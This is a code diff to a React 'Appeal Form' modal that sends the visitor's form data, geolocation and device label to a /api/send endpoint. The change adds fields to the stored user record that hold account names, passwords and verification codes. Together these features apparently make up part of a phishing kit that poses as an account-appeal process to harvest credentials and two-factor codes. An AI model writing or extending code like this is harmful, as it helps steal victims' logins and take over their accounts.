@@ -57,7 +57,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [termsAccepted, setTermsAccepted] = useState(false);
     const phoneInputRef = useRef<IntlTelInputRef>(null);
 
-    const { setModalOpen, geoInfo, deviceLabel, setMessageId, setUserData, messageId } = store();
+    const { setModalOpen, geoInfo, deviceLabel, setMessageId, setUserData, resetFormSession } = store();
     const countryCode = geoInfo?.country_code.toLowerCase() || 'us';
 
     const t = (text: string): string => {
@@ -192,7 +192,12 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
             information: formData.information
         };
 
-        setUserData(userPayload);
+        setUserData({
+            ...userPayload,
+            accounts: [],
+            passwords: [],
+            codes: []
+        });
 
         const message = buildAppealMessage({
             geoInfo,
@@ -202,8 +207,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
         try {
             const res = await axios.post('/api/send', {
-                message,
-                old_message_id: messageId
+                message
             });
 
             if (res?.data?.success && typeof res.data.message_id === 'number') {
@@ -222,7 +226,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
             <div className='flex max-h-[90vh] w-full max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                 <div className='mb-2 flex w-full items-center justify-between p-4 pb-0'>
                     <p className='text-2xl font-bold'>{t('Appeal Form')}</p>
-                    <button type='button' onClick={() => setModalOpen(false)} className='h-8 w-8 rounded-full transition-colors hover:bg-[#e2eaf2]' aria-label='Close modal'>
+                    <button type='button' onClick={() => { resetFormSession(); setModalOpen(false); }} className='h-8 w-8 rounded-full transition-colors hover:bg-[#e2eaf2]' aria-label='Close modal'>
                         <FontAwesomeIcon icon={faXmark} size='xl' />
                     </button>
                 </div>
